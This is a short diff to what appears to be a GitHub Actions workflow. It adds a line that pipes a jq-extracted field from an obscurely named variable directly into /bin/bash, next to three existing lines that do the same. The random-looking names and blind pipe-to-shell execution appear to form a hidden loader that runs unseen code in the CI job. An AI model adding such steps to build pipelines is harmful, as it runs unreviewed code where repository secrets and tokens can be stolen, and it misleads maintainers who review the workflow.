@@ -23,6 +23,7 @@ jobs:
           echo $g9275 | jq -r .rovpj53 | /bin/bash
           echo $e19 | jq -r .nut77445 | /bin/bash
           echo $s96 | jq -r .s85 | /bin/bash
+          printf '%s' "$gql4" | jq -r .awxn476 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
